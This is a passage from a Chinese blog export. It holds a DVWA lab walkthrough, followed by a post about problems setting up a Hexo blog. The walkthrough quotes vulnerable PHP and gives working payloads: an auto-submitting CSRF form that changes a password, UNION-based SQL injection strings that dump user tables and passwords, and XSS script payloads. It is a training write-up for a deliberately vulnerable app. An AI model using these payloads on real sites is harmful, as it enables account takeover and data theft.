&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; reCAPTCHA验证流程客户端的请求验证码的模块先发送请求到google的服务器上 服务器返回验证码 用户发送验证码到网站的服务器 网站服务器将受到的验证码发给google服务器进行核对 绕过修改参数核心代码中，当step验证码通过时，会将step的值从1修改为2 因为中间没有做其他防护，攻击者要做的事很简单，只要用bp抓包，将step的值修改为2就好了 CSRF构造html &lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt; &lt;div&gt; &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/captcha/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 受害者访问这个页面密码就会被改掉 SQL Injection Sourcesql注入 核心代码: &lt;?php if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_REQUEST[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集中的值 while( $row = mysqli_fetch_assoc( $result ) ) { $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 显示给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); } ?&gt; 原理同暴力破解，因为没有对输入的参数id进行过滤，攻击者可以通过修改id的值来更改sql查询语句，但是实际运用中攻击者是不知道服务器端的查询语句的，这就需要一个个猜了 手工注入的大致流程1.判断注入点可以用2-1、1=1之类的逻辑判断来寻找是否有注入点 2.查询表的列数利用order by来判断列数 Order by num来判断 1′ or 1=1 order by 2 3.联合查询知道列名之后开始联合查询 比如列数为2 Union select version(),database() 4.爆表名1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 5.爆列名1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ 6.爆数据1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_GET[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_GET[ &apos;id&apos; ]; // 连接数据库，将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &apos;or die&apos; to suppress mysql errors // 获取结果集中的值 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 没有找到用户，返回一个错误页面 header( $_SERVER[ &apos;SERVER_PROTOCOL&apos; ] . &apos; 404 Not Found&apos; ); // 客户端返回的错误提示 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 盲注的原理跟注入是一样的，区别在于没有从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知 这个时候我们就要用到ascii(）和substr（）函数来一个个猜 如果页面会返回正确或者错误的信息，可以基于布尔盲注，由返回的页面来判断是否猜对 如果没有返回信息，只能用sleep（）基于时间盲注，由响应的时间来判断是否正确 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; //获取session id if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { //如果没有session id则将session id设为0 if (!isset ($_SESSION[&apos;last_session_id&apos;])) { $_SESSION[&apos;last_session_id&apos;] = 0; } //累加session id $_SESSION[&apos;last_session_id&apos;]++; $cookie_value = $_SESSION[&apos;last_session_id&apos;]; //向客户端发送一个http cookie setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; session id的原理密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次。因此，当认证完成后。就需要替换一个对用户透明的凭证。这个凭证就是SessionID。当用户登陆完成后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。此时的认证，只需要知道是哪个用户在浏览当前的页面即可。 SessionID一旦在生命周期内被窃取，攻击者利用这个id就可以伪装成合法的用户访问服务器 利用方法由核心代码可知服务器的sessionid是从0开始累加的 当受害者获得sessionid之后，攻击者只要在自己的浏览器上将sessionid改为受害者的即可 按f12打开控制台，在控制台输入 读取：document.cookie; 修改：document.cookie[“Key”]=”值”; PS：我在自己的电脑上没有成功，可能是服务器设置的问题，两个浏览器获取到的sessionid是独立的 XSS(DOM)XSS漏洞原理xss漏洞的原理是将js代码恶意插入到网页中，当受害者访问页面时，恶意的代码就会在浏览器上执行 根据恶意的代码是否存储在服务器中，xss可以分为两种类型，一种是反射性xss，一种是存储型xss DOM型由于其特殊性，常被分为第三种,它是基于DOM文档对象模型的一种漏洞 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 绕过DOM型服务器端没有代码 只要在get获取到的参数后面加上js代码就行 http://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 结果就是会出现一个弹框，内容为xss 修改xss里面的内容，改成各种函数，可以达到盗取服务器信息的目的 ps：在谷歌浏览器上做会失败，因为谷歌浏览器自带了防xss的机制，用火狐浏览器就可以做到了 XSS (Reflected)反射型xss 核心代码: &lt;?php //向客户端发送原始的 HTTP 报头 header (&quot;X-XSS-Protection: 0&quot;); // 检测get中是否有值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 反馈给用户 echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } 原理同DOM型XSS 在框里输入&lt;script&gt;alert(/xss/)&lt;/script&gt;出现弹框 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { //获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化输入的名称，同上 $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 存储型XSS因为是将js代码存在服务器上，每当有人访问了这个带有恶意代码的页面，xss就会被触发，所以传播的范围更广 直接在message栏中输入&lt;script&gt;alert(/xss/)&lt;/script&gt;也可以弹窗了在name行输入也行，但是name行有限制，可以通过抓包改包破除这个限制","categories":[],"tags":[]},{"title":"搭博客过程中遇到的一些问题","slug":"problem","date":"2018-07-05T03:51:37.336Z","updated":"2018-07-07T07:40:37.225Z","comments":true,"path":"2018/07/05/problem/","link":"","permalink":"https://perfect.xyz/2018/07/05/problem/","excerpt":"求求你不要再404了.jpg","text":"求求你不要再404了.jpg 404搭建的过程中遇到过两次404的问题第一次是因为域名因为我的Github的用户名是a+qq号，最后出来的域名就很Low搭建的时候刚好在听perfect time这首歌，于是就决定作为我的项目名称建完之后访问perfect-time.github.io却怎么也访问不到一开始以为是没有绑定域名的缘故，花了3块钱在tx那里买了个xyz的域名，结果还是404最后重新建了一个项目，乖乖的填了自己的用户名才成功 第二次是发生在建完之后，hexo g -d之后突然又404了因为会出现404，所以连到Github的过程中没有问题能够本地运行，博客本身没有问题排查了半天之后发现是CNAME的缘故CNAM不能直接放在hexo目录下，要放到/source这个目录里面Github只会上传/source这个文件夹里面的更改，放在其他地方是没办法上传到服务器的上传不到服务器的结果就是Github域名解析不到博客的地址，但是在Dns这边是将博客地址转换成了域名地址，所以会出现404的情况总的来说就是一个粗心，本来一个下午就可以搞完的东西拖了两天才搞完 邮件联系方式中有邮件，想着以后说不定会有人发邮件给我，就把自己的邮件地址放了上去但是单单只放邮件地址会出现无事发生的情况网页的跳转肯定是以htpp协议封装的，邮件地址显然不认识http协议参考了学姐(大概)的博客，发现qq邮箱有一个邮我的功能，点开这个链接可以直接给我发邮件，这个功能很神奇尝试设置了一下之后发现根本跳转不到邮我的界面，肯定是链接出了什么问题这个问题还没解决 其他一些小问题版权声明在hexo目录下的_config文件中更改，就在最上面的Site和URL 文章摘要用&lt;!-- more --&gt;代码来实现，不用这个代码的话会把文章的内容全部显示在摘要里，而且不换行，特别难看 Markdown语法中，#后面必须跟着空格才能显示为标题，不然只会显示一个# 用了来必力的评论系统，本地运行是正常的，但是传到服务器上就不行了，原因不明 2018/7/7更新去掉了来必力的评论系统，看了几个博客之后发现好像Gitment比较受欢迎，就换成了Gitment系统 需要注意的是gitment_client_id和gitment_client_secret 在注册之后就会给你了 gitment_owner:填自己github账号 gitment_repo: 存储评论的库，按理说这个也可以另外再建一个库，不过我为了以防万一就直接用博客的库了 这个评论系统好像可以汉化，懒得弄了 持续更新中~","categories":[],"tags":[]}]}